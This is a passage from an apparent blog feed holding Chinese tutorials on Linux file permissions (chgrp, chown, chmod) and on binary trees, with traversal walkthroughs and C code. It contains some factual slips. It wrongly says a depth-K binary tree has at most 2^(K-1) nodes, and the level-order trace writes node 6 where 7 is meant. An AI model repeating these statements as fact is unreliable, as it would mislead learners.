而已</strong>。</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/file-llls22.jpg" alt="img"></p><p>每个文件的属性由左边第一部分的 10 个字符来确定（如下图）。</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/363003_1227493859FdXT.png" alt="363003_1227493859FdXT"></p><p>从左至右用 <strong>0-9</strong> 这些数字来表示。</p><p>第 <strong>0</strong> 位确定文件类型，第 <strong>1-3</strong> 位确定属主（该文件的所有者）拥有该文件的权限。</p><p>第4-6位确定属组（所有者的同组用户）拥有该文件的权限，第7-9位确定其他用户拥有该文件的权限。</p><p>其中，第 <strong>1、4、7</strong> 位表示读权限，如果用 r 字符表示，则有读权限，如果用 - 字符表示，则没有读权限；</p><p>第 <strong>2、5、8</strong> 位表示写权限，如果用 w 字符表示，则有写权限，如果用 - 字符表示没有写权限；第 <strong>3、6、9</strong> 位表示可执行权限，如果用 x 字符表示，则有执行权限，如果用 - 字符表示，则没有执行权限。</p><hr><h2 id="Linux文件属主和属组"><a href="#Linux文件属主和属组" class="headerlink" title="Linux文件属主和属组"></a>Linux文件属主和属组</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@www /]<span class="comment"># ls -l</span></span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x<span class="number"> 2 </span>root  root <span class="number"> 4096 </span>Feb<span class="number"> 15 </span>14:46 cron</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>mysql mysql<span class="number"> 4096 </span>Apr<span class="number"> 21 </span><span class="number"> 2014 </span>mysql</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>对于文件来说，它都有一个特定的所有者，也就是对该文件具有所有权的用户。</p><p>同时，在Linux系统中，用户是按组分类的，一个用户属于一个或多个组。</p><p>文件所有者以外的用户又可以分为文件所属组的同组用户和其他用户。</p><p>因此，Linux系统按文件所有者、文件所有者同组用户和其他用户来规定了不同的文件访问权限。</p><p>在以上实例中，mysql 文件是一个目录文件，属主和属组都为 mysql，属主有可读、可写、可执行的权限；与属主同组的其他用户有可读和可执行的权限；其他用户也有可读和可执行的权限。</p><p>对于 root 用户来说，一般情况下，文件的权限对其不起作用。</p><hr><h2 id="更改文件属性"><a href="#更改文件属性" class="headerlink" title="更改文件属性"></a>更改文件属性</h2><h3 id="1、chgrp：更改文件属组"><a href="#1、chgrp：更改文件属组" class="headerlink" title="1、chgrp：更改文件属组"></a>1、chgrp：更改文件属组</h3><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chgrp</span> [-R] 属组名 文件名</span><br></pre></td></tr></table></figure><p>参数选项</p><ul><li>-R：递归更改文件属组，就是在更改某个目录文件的属组时，如果加上-R的参数，那么该目录下的所有文件的属组都会更改。</li></ul><h3 id="2、chown：更改文件属主，也可以同时更改文件属组"><a href="#2、chown：更改文件属主，也可以同时更改文件属组" class="headerlink" title="2、chown：更改文件属主，也可以同时更改文件属组"></a>2、chown：更改文件属主，也可以同时更改文件属组</h3><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> [–R] 属主名 文件名</span><br><span class="line"><span class="built_in">chown</span> [-R] 属主名：属组名 文件名</span><br></pre></td></tr></table></figure><p>进入 /root 目录（~）将install.log的拥有者改为bin这个账号：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@www</span> ~] cd ~</span><br><span class="line">[root<span class="symbol">@www</span> ~]<span class="meta"># chown bin install.log</span></span><br><span class="line">[root<span class="symbol">@www</span> ~]<span class="meta"># ls -l</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> bin  users <span class="number">68495</span> Jun <span class="number">25</span> <span class="number">08</span>:<span class="number">53</span> install.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>将install.log的拥有者与群组改回为root：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@www</span> ~]<span class="meta"># chown root:root install.log</span></span><br><span class="line">[root<span class="symbol">@www</span> ~]<span class="meta"># ls -l</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> root root <span class="number">68495</span> Jun <span class="number">25</span> <span class="number">08</span>:<span class="number">53</span> install.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><h3 id="3、chmod：更改文件9个属性"><a href="#3、chmod：更改文件9个属性" class="headerlink" title="3、chmod：更改文件9个属性"></a>3、chmod：更改文件9个属性</h3><p>Linux文件属性有两种设置方法，一种是数字，一种是符号。</p><p>Linux 文件的基本权限就有九个，分别是 <strong>owner/group/others(拥有者/组/其他)</strong> 三种身份各有自己的 <strong>read/write/execute</strong> 权限。</p><p>先复习一下刚刚上面提到的数据：文件的权限字符为： -rwxrwxrwx ， 这九个权限是三个三个一组的！其中，我们可以使用数字来代表各个权限，各权限的分数对照表如下：</p><ul><li>r:4</li><li>w:2</li><li>x:1</li></ul><p>每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： -rwxrwx—- 分数则是：</p><ul><li>owner = rwx = 4+2+1 = 7</li><li>group = rwx = 4+2+1 = 7</li><li>others= —- = 0+0+0 = 0</li></ul><p>所以等一下我们设定权限的变更时，该文件的权限数字就是 <strong>770</strong>。变更权限的指令 chmod 的语法是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> [-R] xyz 文件或目录</span><br></pre></td></tr></table></figure><p>选项与参数：</p><ul><li><strong>xyz</strong> : 就是刚刚提到的数字类型的权限属性，为 <strong>rwx</strong> 属性数值的相加。</li><li><strong>-R</strong> : 进行递归(recursive)的持续变更，以及连同次目录下的所有文件都会变更</li></ul><p>举例来说，如果要将 <strong>.bashrc</strong> 这个文件所有的权限都设定启用，那么命令如下：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># ls -al .bashrc</span></span><br><span class="line">-rw-r--r-- <span class="number"> 1 </span>root root<span class="number"> 395 </span>Jul <span class="number"> 4 </span>11:45 .bashrc</span><br><span class="line">[root@www ~]<span class="comment"># chmod 777 .bashrc</span></span><br><span class="line">[root@www ~]<span class="comment"># ls -al .bashrc</span></span><br><span class="line">-rwxrwxrwx <span class="number"> 1 </span>root root<span class="number"> 395 </span>Jul <span class="number"> 4 </span>11:45 .bashrc</span><br></pre></td></tr></table></figure><p>那如果要将权限变成 <em>-rwxr-xr—</em> 呢？那么权限的分数就成为 [4+2+1][4+0+1][4+0+0]=754。</p><h3 id="符号类型改变文件权限"><a href="#符号类型改变文件权限" class="headerlink" title="符号类型改变文件权限"></a>符号类型改变文件权限</h3><p>还有一个改变权限的方法，从之前的介绍中我们可以发现，基本上就九个权限分别是：</p><ul><li>user：用户</li><li>group：组</li><li>others：其他</li></ul><p>那么我们就可以使用 <strong>u, g, o</strong> 来代表三种身份的权限。</p><p>此外， <strong>a</strong> 则代表 <strong>all</strong>，即全部的身份。读写的权限可以写成 r, w, x，也就是可以使用下表的方式来看：</p><div class="table-container"><table><thead><tr><th>chmod</th><th>u g o a</th><th>+(加入) -(除去) =(设定)</th><th>r w x</th><th>文件或目录</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>如果我们需要将文件权限设置为 <strong>-rwxr-xr—</strong> ，可以使用 chmod u=rwx,g=rx,o=r 文件名 来设定:</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  touch test1    // 创建 test1 文件</span></span><br><span class="line"><span class="comment"># ls -al test1    // 查看 test1 默认权限</span></span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root root<span class="number"> 0 </span>Nov<span class="number"> 15 </span>10:32 test1</span><br><span class="line"><span class="comment"># chmod u=rwx,g=rx,o=r  test1    // 修改 test1 权限</span></span><br><span class="line"><span class="comment"># ls -al test1</span></span><br><span class="line">-rwxr-xr--<span class="number"> 1 </span>root root<span class="number"> 0 </span>Nov<span class="number"> 15 </span>10:32 test1</span><br></pre></td></tr></table></figure><p>而如果是要将权限去掉而不改变其他已存在的权限呢？例如要拿掉全部人的可执行权限，则：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  chmod  a-x test1</span></span><br><span class="line"><span class="comment"># ls -al test1</span></span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root root<span class="number"> 0 </span>Nov<span class="number"> 15 </span>10:32 test1</span><br></pre></td></tr></table></figure><hr><h2 id="更多参考内容"><a href="#更多参考内容" class="headerlink" title="更多参考内容"></a>更多参考内容</h2><ul><li><a href="https://www.runoob.com/linux/linux-comm-chgrp.html">Linux chgrp 命令</a></li><li><a href="https://www.runoob.com/linux/linux-comm-chown.html">Linux chown 命令</a></li><li><a href="https://www.runoob.com/linux/linux-comm-chmod.html">Linux chmod 命令</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linuxchalnl 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之二叉树 - BiTree</title>
      <link href="/post/a4f04391.html/"/>
      <url>/post/a4f04391.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="树-Tree"><a href="#树-Tree" class="headerlink" title="树 - Tree"></a>树 - Tree</h1><h2 id="树的基本术语"><a href="#树的基本术语" class="headerlink" title="树的基本术语"></a>树的基本术语</h2><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7gpqbkquyj30g306s0t8.jpg"/>图</a></u> 1 树存储结构</div><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">结点</button></li><li class="tab"><button type="button" data-href="#-2">子树</button></li><li class="tab"><button type="button" data-href="#-3">结点的度</button></li><li class="tab"><button type="button" data-href="#-4">结点的层次</button></li><li class="tab"><button type="button" data-href="#-5">有序树和无序树</button></li><li class="tab"><button type="button" data-href="#-6">森林</button></li><li class="tab"><button type="button" data-href="#-7">空树</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p><strong>父结点（双亲结点）、孩子结点和兄弟结点</strong>：以图 1a) 中的结点 A、B、C、D 为例，A 是 B、C、D 结点的父结点（也称为“双亲结点”），而 B、C、D 都是 A 结点的孩子结点（也称“子结点”）。对于 B、C、D 来说，它们都有相同的父结点，所以它们互为兄弟结点；<br><strong>树根结点（简称 “根结点” ）</strong>：特指树中没有双亲（父亲）的结点，一棵树有且仅有一个根结点。例如图 1a) 中，结点 A 就是整棵树的根结点；<br><strong>叶子结点（简称 “叶结点” ）</strong>：特指树中没有孩子的结点，一棵树可以有多个叶子结点。例如图 1a) 中，结点 K、L、F、G、M、I、J 都是叶子结点。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p> A 是整棵树的根结点。但如果单看结点 B、E、F、K、L 组成的部分来说，它们也组成了一棵树，结点 B 是这棵树的根结点。通常，我们将<strong>一棵树中几个结点构成的“小树”称为这棵树的“子树”</strong>。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><p> 一个结点<strong>拥有子树的个数</strong>，就称为该<strong>结点的度（Degree）</strong>。例如图 1a) 中，根结点 A 有 3 个子树，它们的根节点分别是 B、C、D，因此结点 A 的度为 3。<br>比较一棵树中所有结点的度，最大的度即为整棵树的度。比如图 1a) 中，所有结点中最大的度为 3，所以整棵树的度就是 3。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-4"><p> 从一棵树的树根开始，树根所在层为<strong>第一层</strong>，根的孩子结点所在的层为<strong>第二层</strong>，依次类推。<br>对于图这棵树来说，A 结点在第一层，B、C、D 为第二层，E、F、G、H、I、J 在第三层，K、L、M 在第四层。<br>树中结点层次的最大值，称为这棵树的<strong>深度</strong>或者<strong>高度</strong>。例如图这棵树的深度为 4。<br>如果两个结点的父结点不同，但它们父结点的层次相同，那么这两个结点互为<strong>堂兄弟</strong>。例如图 1a) 中，结点 G 和 E、F、H、I、J 的父结点都在第二层，所以它们互为堂兄弟。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-5"><p> 如果一棵树中，各个结点左子树和右子树的位置不能交换，那么这棵树就称为<strong>有序树</strong>。反之，如果树中结点的左、右子树可以互换，那么这棵树就是一棵<strong>无序树</strong>。<br> 在有序树中，结点最左边的子树称为 “第一个孩子”，最右边的称为 “最后一个孩子”。拿图这棵树来说，如果它是一棵有序树，那么以结点 B 为根结点的子树为整棵树的第一个孩子，以结点 D 为根结点的子树为整棵树的最后一个孩子。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-6"><p> 由 m（m &gt;= 0）个互不相交的树组成的集合就称为<strong>森林</strong>。比如图 1a) 中除去 A 结点，那么分别以 B、C、D 为根结点的三棵子树就可以称为森林。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-7"><p>空树指的是没有任何结点的树，连根结点都没有.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="二叉树-BiTree"><a href="#二叉树-BiTree" class="headerlink" title="二叉树 - BiTree"></a>二叉树 - BiTree</h2><h3 id="二叉树的分类及性质"><a href="#二叉树的分类及性质" class="headerlink" title="二叉树的分类及性质"></a>二叉树的分类及性质</h3><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">二叉树的性质</button></li><li class="tab"><button type="button" data-href="#-2">满二叉树的性质</button></li><li class="tab"><button type="button" data-href="#-3">完全二叉树的性质</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7hkdh16ifj30ci05u3z3.jpg"/></div><ol><li>二叉树中，第 <strong>i</strong> 层最多有 <strong>2<sup>i-1</sup></strong> 个结点。</li><li>如果二叉树的深度为 <strong>K</strong>，那么此二叉树最多有 <strong>2<sup>K-1</sup></strong> 个结点。</li><li>二叉树中，终端结点数（叶子结点数）为 <strong>n<sub>0</sub></strong> ，度为 2 的结点数为 <strong>n<sub>2</sub></strong>，则 <strong>n<sub>0</sub>=n<sub>2</sub>+1</strong>。</li></ol><blockquote><p><strong>性质 3 的计算方法为</strong>：对于一个二叉树来说，除了度为 0 的叶子结点和度为 2 的结点，剩下的就是度为 1 的结点（设为 n1），那么总结点 <strong>n=n<sub>0</sub>+n<sub>1</sub>+n<sub>2</sub></strong>。<br>同时，对于每一个结点来说都是由其父结点分支表示的，假设树中分枝数为 <strong>B</strong>，那么总结点数 <strong>n=B+1</strong>。而分枝数是可以通过 <strong>n<sub>1</sub></strong> 和 <strong>n<sub>2</sub></strong> 表示的，即 <strong>B=n<sub>1</sub>+2*n<sub>2</sub></strong>。所以，<strong><em>n</em></strong> 用另外一种方式表示为 <strong>n=n<sub>1</sub>+2*n<sub>2</sub>+1</strong>。<br>两种方式得到的 <strong>n</strong> 值组成一个方程组，就可以得出 <strong>n<sub>0</sub>=n<sub>2</sub>+1</strong>。</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>如果二叉树中除了叶子结点，每个结点的度都为 2，则此二叉树称为满二叉树。</p><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7hlr3jnunj308c05kwem.jpg"/></div><ul><li>满足普通二叉树的性质，还具有以下性质。</li></ul><ol><li>满二叉树中第 <strong>i</strong> 层的节点数为 <strong>2<sup>i-1</sup></strong> 个。</li><li>深度为 <strong>k</strong> 的满二叉树必有 <strong>2<sup>k</sup>-1</strong> 个节点 ，叶子数为 <strong>2<sup>k-1</sup></strong>。</li><li>满二叉树中不存在度为 <strong>1</strong> 的节点，每一个分支点中都两棵深度相同的子树，且叶子节点都在最底层。</li><li>具有 <strong>n</strong> 个节点的满二叉树的深度为 <strong>log<sub>2</sub>(n+1)</strong>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><p>如果二叉树中除去最后一层节点为满二叉树，且最后一层的结点依次从左到右分布，则此二叉树被称为完全二叉树。</p><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7hlzqj519j30ci05naaf.jpg"/></div><blockquote><p><strong>n 个结点的完全二叉树的深度为 &lfloor;log<sub>2</sub>n&rfloor;+1。</strong></p><blockquote><p><strong>&lfloor;log<sub>2</sub>n&rfloor;</strong> 表示取小于 <strong>log<sub>2</sub>n</strong> 的最大整数。例如，<strong>&lfloor;log<sub>2</sub>4&rfloor; = 2</strong>，而 <strong>&lfloor;log<sub>2</sub>5&rfloor;</strong> 结果也是 <strong>2</strong>。</p></blockquote></blockquote><ol><li>当 <strong>i&gt;1</strong> 时，父亲结点为结点 <strong>[i/2]</strong> 。（i=1 时，表示的是根结点，无父亲结点）</li><li>如果 <strong>2*i&gt;n</strong>（总结点的个数），则结点<strong>i</strong>肯定没有左孩子（为叶子结点）；否则其左孩子是结点 <strong>2*i</strong>。</li><li>如果 <strong>2*i+1&gt;n</strong> ，则结点 <strong>i</strong> 肯定没有右孩子；否则右孩子是结点 <strong>2*i+1</strong> 。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="二叉树-四种遍历方法介绍"><a href="#二叉树-四种遍历方法介绍" class="headerlink" title="二叉树 四种遍历方法介绍"></a>二叉树 四种遍历方法介绍</h3><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">先序遍历</button></li><li class="tab"><button type="button" data-href="#-2">中序遍历</button></li><li class="tab"><button type="button" data-href="#-3">后序遍历</button></li><li class="tab"><button type="button" data-href="#-4">层次遍历</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7hutdfoghj309q06m3yq.jpg"/></div><p><strong>访问次序</strong></p><blockquote><p>1 2 4 5 3 6 7</p></blockquote><p><strong>访问过程</strong></p><blockquote><p>访问根节点 1；<br>进入 1 的左子树，执行同样的步骤：<br>    访问结点 2；<br>    进入 2 的左子树，执行同样的步骤：<br>        访问结点 4；<br>        结点 4 没有左子树；<br>        结点 4 没有右子树；<br>    进入 2 的右子树，执行同样的步骤：<br>        访问结点 5；<br>        结点 5 没有左子树；<br>        结点 5 没有右子树；<br>进入 1 的右子树，执行同样的步骤：<br>    访问结点 3；<br>    进入 3 的左子树，执行同样的步骤：<br>        访问结点 6；<br>        结点 6 没有左子树；<br>        结点 6 没有右子树；<br>    进入 3 的右子树，执行同样的步骤：<br>        访问结点 7；<br>        结点 7 没有左子树；<br>        结点 7 没有右子树； </p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7hutdfoghj309q06m3yq.jpg"/></div><p><strong>访问次序</strong></p><blockquote><p>4 2 5 1 6 3 7</p></blockquote><p><strong>访问过程</strong></p><blockquote><p>进入结点 1 的左子树，访问左子树中的结点；<br>    进入结点 2 的左子树，访问左子树中的结点；<br>        试图进入结点 4 的左子树，但该结点没有左子树；<br>        访问结点 4；<br>        试图进入结点 4 的右子树，但该结点没有右子树；<br>    访问结点 2；<br>    进入结点 2 的右子树，访问右子树中的结点；<br>        试图进入结点 5 的左子树，但该结点没有左子树；<br>        访问结点 5；<br>        试图进入结点 5 的右子树，但该结点没有右子树；<br>访问结点 1；<br>进入结点 1 的右子树，访问右子树中的结点；<br>    进入结点 3 的左子树，访问左子树中的结点；<br>        试图进入结点 6 的左子树，但该结点没有左子树；<br>        访问结点 6；<br>        试图进入结点 6 的右子树，但该结点没有右子树；<br>    访问结点 3；<br>    进入结点 3 的右子树，访问右子树中的结点；<br>        试图进入结点 7 的左子树，但该结点没有左子树；<br>        访问结点 7；<br>        试图进入结点 7 的右子树，但该结点没有右子树；</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7hutdfoghj309q06m3yq.jpg"/></div><p><strong>访问次序</strong></p><blockquote><p>4 5 2 6 7 3 1</p></blockquote><p><strong>访问过程</strong></p><blockquote><p>从根节点 1 出发，进入该结点的左子树；<br>    进入结点 2 的左子树，遍历左子树中的结点：<br>        进入结点 4 的左子树，但该结点没有左孩子；<br>        进入结点 4 的右子树，但该结点没有右子树；<br>        访问结点 4；<br>    进入结点 2 的右子树，遍历右子树中的结点：<br>        进入结点 5 的左子树，但该结点没有左孩子；<br>        进入结点 5 的右子树，但该结点没有右孩子；<br>        访问结点 5；<br>    访问结点 2；<br>进入结点 1 的右子树，遍历右子树中的结点：<br>    进入结点 3 的左子树，遍历左子树中的结点：<br>        进入结点 6 的左子树，但该结点没有左孩子；<br>        进入结点 6 的右子树，但该结点没有右子树；<br>        访问结点 6；<br>    进入结点 3 的右子树，遍历右子树中的结点：<br>        进入结点 7 的左子树，但该结点没有左孩子；<br>        进入结点 7 的右子树，但该结点没有右孩子；<br>        访问结点 7；<br>    访问结点 3；<br>访问结点 1。</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-4"><div align=center><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h7hv02yvjpj30ci05ft94.jpg"/></div><p><strong>访问过程</strong></p><blockquote><p>根结点 1 入队（1）；<br>根结点 1 出队并访问它，然后将 1 的左孩子 2 和右孩子 3 依次入队（3, 2）；<br>将结点 2 出队并访问它，然后将 2 的左孩子 4 和右孩子 5 依次入队（5,4,3）；<br>将结点 3 出队并访问它，然后将 3 的左孩子 6 和右孩子 7 依次入队（7,6,5,4）；<br>根结点 4 出队并访问它，然后将 4 的左孩子（无）和右孩子（无）依次入队（7,6,5）；<br>将结点 5 出队并访问它，然后将 5 的左孩子（无）和右孩子（无）依次入队（7,6）；<br>将结点 6 出队并访问它，然后将 6 的左孩子（无）和右孩子（无）依次入队（7）；<br>将结点 7 出队并访问它，然后将 6 的左孩子（无）和右孩子（无）依次入队（）；<br>队列为空，层次遍历结束。 </p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="二叉树的代码实现"><a href="#二叉树的代码实现" class="headerlink" title="二叉树的代码实现"></a>二叉树的代码实现</h3><ol><li><p><strong>结构体的创建</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiNode</span> &#123;</span></span><br><span class="line">TElemType data;                 <span class="comment">//数据存储</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiNode</span>* <span class="title">lchild</span>, * <span class="title">rchild</span>;</span><span class="comment">//左孩子 右孩子</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure></li><li><p><strong>二叉树递归实现</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">CreateBiTree</span><span class="params">(BiTree&amp; T)</span> &#123;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;ch);</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;#&#x27;</span>) T = <span class="literal">NULL</span>;         <span class="comment">//#代表空节点</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!(T = (BiTNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode)))) <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">T-&gt;data = ch;            <span class="comment">//写入结点数据</span></span><br><span class="line">CreateBiTree(T-&gt;lchild); <span class="comment">//递归左孩子</span></span><br><span class="line">CreateBiTree(T-&gt;rchild); <span class="comment">//递归右孩子</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>二叉树先序遍历</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PreorderTraverse</span><span class="params">(BiTree T, Status(*visit)(TElemType e))</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T) &#123;    <span class="comment">//先输出 --&gt; 递归遍历左子树 --&gt; 递归遍历右子树</span></span><br><span class="line"><span class="keyword">if</span> (visit(T-&gt;data))</span><br><span class="line"><span class="keyword">if</span> (PreorderTraverse(T-&gt;lchild, visit))</span><br><span class="line"><span class="keyword">if</span> (PreorderTraverse(T-&gt;rchild, visit)) </span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p><strong>二叉树中序遍历</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InorderTraverse1</span><span class="params">(BiTree T, Status(*visit)(TElemType e))</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T) &#123;    <span class="comment">//递归遍历左子树 --&gt; 输出数据 --&gt; 递归遍历右子树</span></span><br><span class="line"><span class="keyword">if</span> (InorderTraverse1(T-&gt;lchild, visit))</span><br><span class="line"><span class="keyword">if</span> (visit(T-&gt;data))</span><br><span class="line"><span class="keyword">if</span> (InorderTraverse1(T-&gt;rchild, visit)) </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>二叉树后序遍历</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PostorderTraverse</span><span class="params">(BiTree T, Status(*visit)(TElemType e))</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T) &#123;    <span class="comment">//递归遍历左子树 --&gt; 递归遍历右子树 --&gt; 输出数据</span></span><br><span class="line"><span class="keyword">if</span> (PostorderTraverse(T-&gt;lchild, visit))</span><br><span class="line"><span class="keyword">if</span> (PostorderTraverse(T-&gt;rchild, visit))</span><br><span class="line"><span class="keyword">if</span> (visit(T-&gt;data))<span class="keyword">return</span> OK;</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>输出函数</strong></p><figure 